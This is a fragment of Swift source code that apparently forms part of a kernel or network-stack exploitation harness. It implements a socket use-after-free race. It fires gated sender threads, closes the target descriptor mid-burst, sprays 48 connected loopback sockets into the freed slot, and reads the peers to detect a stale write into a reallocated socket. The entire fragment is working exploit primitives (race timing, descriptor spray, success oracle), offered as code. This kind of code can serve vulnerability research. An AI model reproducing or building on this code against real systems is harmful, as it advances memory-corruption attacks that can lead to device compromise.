    // Connected spray: sockets are freshly connected to the precision listener,
    // never sent on, so any byte their peer receives proves a stale sender
    // delivered into a reallocated socket.
    nonisolated func sockUafSprayConnected(_ n: Int, _ port: Int) -> [Int32] {
        var fds: [Int32] = []
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr)
        for _ in 0..<n {
            let fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            if fd < 0 { break }
            _ = withUnsafePointer(to: &addr) { q in
                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    connect(fd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
            fds.append(fd)
        }
        return fds
    }

    // Precision race: every sender fires exactly one message from a gate, the
    // close lands inside that burst, then the slot is refilled with connected
    // sockets. Bytes seen at the precision peers == stale write.
    nonisolated func sockUafRacePrecision(_ st: SockUafState, _ target: Int32,
                                          _ it: Int, _ precPort: Int,
                                          _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
        let n = 6
        st.fd = target
        st.done = 0
        st.phase = 1
        st.mode = 1
        usleep(60)                       // let every sender park on the gate
        st.gate = 1                      // burst
        usleep(UInt32.random(in: 0...4))
        st.phase = 2
        var spins = 0
        while st.phase != 3 && spins < 400_000 { spins &+= 1 }
        if st.phase != 3 {
            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
        }
        let spray = sockUafSprayConnected(48, precPort)
        var w = 0
        while st.done < Int32(n) && w < 200_000 { w &+= 1 }
        st.gate = 0
        st.phase = 0
        st.fd = -1
        st.mode = 0
        usleep(150)
        // Drain every peer of the spray sockets.
        var got = 0
        var rbuf = [UInt8](repeating: 0, count: 65536)
        peerLock.lock()
        let snapshot = peers
        peers.removeAll()
        peerLock.unlock()
        for pf in snapshot {
            var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            while r > 0 {
                got += r
                if got > 0x100000 { break }
                r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
            }
        }
        for pf in snapshot { close(pf) }
        for fd in spray { close(fd) }
        if got > 0 {
            emitBg("[!] ITER \(it) precision: *** STALE WRITE: \(got) byte(s) delivered into a reallocated socket ***")
            return true
        }
        return false
    }

